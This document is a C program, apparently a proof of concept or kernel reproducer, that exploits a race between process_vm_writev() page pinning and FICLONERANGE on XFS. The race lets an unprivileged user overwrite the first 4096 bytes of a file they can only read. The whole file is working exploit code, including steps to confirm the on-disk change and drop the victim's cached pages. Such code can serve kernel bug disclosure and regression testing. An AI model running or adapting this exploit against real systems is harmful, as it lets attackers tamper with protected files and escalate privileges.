// SPDX-License-Identifier: GPL-2.0
/*
 * usage: prog DIR VICTIM [TRIES]
 *
 * VICTIM is a file on XFS that the caller can only read.  DIR is a
 * directory on the same filesystem that the caller can write.  The
 * first 4096 bytes of VICTIM get overwritten on disk.
 *
 * The write does not go through the page cache of VICTIM, so buffered
 * reads show the old data while its pages stay cached.  The program
 * checks with an O_DIRECT read and drops those pages after a hit.
 *
 * process_vm_writev() pins its destination pages, copies into them,
 * marks them dirty and drops the pins.  The copy faults in the source
 * buffer, so each source page that is not in the page cache costs one
 * disk read.  Thread i reads BASE + i * STEP such pages, so the
 * threads mark the folio dirty one after the other: some during
 * FICLONERANGE, some after it.
 *
 * A starts out full of 'a'.  The threads write pages that begin with a
 * line that differs in each run.
 */
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <linux/fs.h>

#define NT	64
#define BASE	8
#define STEP	2
#define MAXPG	(BASE + (NT - 1) * STEP)
#define PG	4096
#define FOLIO	(16 * PG)

static pthread_barrier_t bar;
static char *dst, *src;

static void die(const char *what)
{
	perror(what);
	exit(1);
}

/* the first source page of thread i */
static long first(long i)
{
	return i * BASE + i * (i - 1) / 2 * STEP;
}

static void *writer(void *arg)
{
	long i = (long)arg, len = (BASE + i * STEP) * PG;
	struct iovec l = { src + first(i) * PG, len }, r = { dst, len };

	pthread_barrier_wait(&bar);
	if (process_vm_writev(getpid(), &l, 1, &r, 1, 0) != len)
		die("process_vm_writev");
	return NULL;
}

int main(int ac, char **av)
{
	static char orig[PG] __attribute__((aligned(PG)));
	static char disk[PG] __attribute__((aligned(PG)));
	static char fill[FOLIO], late[PG];
	struct file_clone_range r = { .src_length = PG };
	int afd, lfd, vfd, try, tries = 200, busy = 0;
	long total = first(NT), i;
	char a[600], l[600], tag[33];
	unsigned char vec;
	pthread_t th[NT];

	if (ac < 3)
		return 2;
	if (ac > 3)
		tries = atoi(av[3]);
	snprintf(a, sizeof(a), "%s/A", av[1]);
	snprintf(l, sizeof(l), "%s/L", av[1]);
	r.src_fd = open(av[2], O_RDONLY);
	vfd = open(av[2], O_RDONLY | O_DIRECT);
	lfd = open(l, O_RDWR | O_CREAT | O_TRUNC, 0600);
	if (r.src_fd < 0 || vfd < 0 || lfd < 0)
		die("open");
	if (pread(vfd, orig, PG, 0) != PG)
		die("pread VICTIM");

	memset(fill, 'a', FOLIO);
	for (i = 0; i < PG; i += 16)
		memcpy(late + i, "overwritten....\n", 16);
	snprintf(tag, sizeof(tag), "run %-10d at %-13ld\n", getpid(),
		 (long)time(NULL));
	memcpy(late, tag, 32);
	for (i = 0; i < total; i++) {
		if (pwrite(lfd, late, PG, i * PG) != PG)
			die("pwrite L");
	}
	fsync(lfd);
	pthread_barrier_init(&bar, NULL, NT);

	for (try = 1; try <= tries; try++) {
		/* A has one 64k folio. */
		unlink(a);
		afd = open(a, O_RDWR | O_CREAT, 0600);
		if (afd < 0 || pwrite(afd, fill, FOLIO, 0) != FOLIO)
			die("A");
		fsync(afd);

		/* Map page 0 of A many times in a row, all writable. */
		dst = mmap(NULL, MAXPG * PG, PROT_NONE,
			   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		for (i = 0; i < MAXPG; i++) {
			char *p = dst + i * PG;

			if (mmap(p, PG, PROT_READ | PROT_WRITE,
				 MAP_SHARED | MAP_FIXED, afd, 0) != p)
				die("mmap A");
			*p = 'a';
		}

		/* No page of L is cached, and a fault reads one page. */
		posix_fadvise(lfd, 0, 0, POSIX_FADV_DONTNEED);
		src = mmap(NULL, total * PG, PROT_READ, MAP_SHARED, lfd,
			   0);
		if (src == MAP_FAILED)
			die("mmap L");
		madvise(src, total * PG, MADV_RANDOM);

		for (i = 0; i < NT; i++) {
			if (pthread_create(&th[i], NULL, writer,
					   (void *)i))
				die("pthread_create");
		}
		/* A thread that has read a source page holds its pins. */
		for (i = 0; i < NT; i++) {
			do {
				if (mincore(src + first(i) * PG, PG, &vec))
					die("mincore");
			} while (!(vec & 1));
		}

		if (ioctl(afd, FICLONERANGE, &r)) {
			if (errno != EBUSY)
				die("FICLONERANGE");
			busy++;
		}
		/*
		 * unpin_user_pages_dirty_lock() skips a dirty folio.
		 * Clean the folio while pins are held, so that the next
		 * thread to finish sets the dirty bit of every block.
		 */
		fsync(afd);
		for (i = 0; i < NT; i++)
			pthread_join(th[i], NULL);
		fsync(afd);

		if (pread(vfd, disk, PG, 0) != PG)
			die("pread VICTIM");
		munmap(src, total * PG);
		munmap(dst, MAXPG * PG);
		close(afd);
		if (memcmp(disk, orig, PG)) {
			posix_fadvise(r.src_fd, 0, 0, POSIX_FADV_DONTNEED);
			printf("try %d: VICTIM overwritten with %s\n", try,
			       memcmp(disk, late, PG) ? "other data" :
			       "the data of this run");
			return 0;
		}
	}
	printf("%d tries, %d EBUSY: VICTIM unchanged\n", tries, busy);
	return 1;
}
